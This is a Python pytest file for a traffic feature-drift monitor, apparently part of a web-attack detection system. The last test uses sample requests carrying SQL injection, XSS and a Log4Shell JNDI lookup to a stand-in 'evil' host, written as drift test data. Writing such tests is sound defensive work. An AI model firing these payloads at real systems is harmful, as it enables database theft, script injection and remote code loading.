"""Feature-drift (PSI) tests. Needs numpy + canonical_features (present in CI via requirements)."""
import os
import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

np = pytest.importorskip("numpy")
pytest.importorskip("ml.canonical_features")

from metrics.drift import FeatureDriftMonitor, psi  # noqa: E402


def test_psi_zero_for_same_distribution():
    x = np.random.RandomState(0).normal(size=5000)
    assert psi(x, x.copy()) < 0.05


def test_psi_high_for_shifted_distribution():
    rs = np.random.RandomState(0)
    a = rs.normal(0, 1, 5000)
    b = rs.normal(5, 1, 5000)     # large mean shift
    assert psi(a, b) > 0.25


def test_monitor_no_drift_on_same_traffic():
    benign = [("GET", "/", f"q=hello world {i}", "") for i in range(200)]
    with tempfile.TemporaryDirectory() as tmp:
        mon = FeatureDriftMonitor(ref_path=Path(tmp) / "ref.json")
        mon.fit_reference(benign)
        rep = mon.check(benign)
        assert not rep.retrain_recommended
        assert rep.psi_max < 0.25


def test_monitor_flags_drift_on_different_traffic():
    benign = [("GET", "/", f"q=hello world number {i}", "") for i in range(200)]
    attacky = [("POST", "/x", f"id={i}' OR '1'='1 UNION SELECT a,b,c FROM users--",
                "<script>alert(1)</script>${jndi:ldap://evil/a}" * 3) for i in range(200)]
    with tempfile.TemporaryDirectory() as tmp:
        mon = FeatureDriftMonitor(ref_path=Path(tmp) / "ref.json")
        mon.fit_reference(benign)
        rep = mon.check(attacky)
        assert rep.retrain_recommended
        assert rep.drifted_features


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
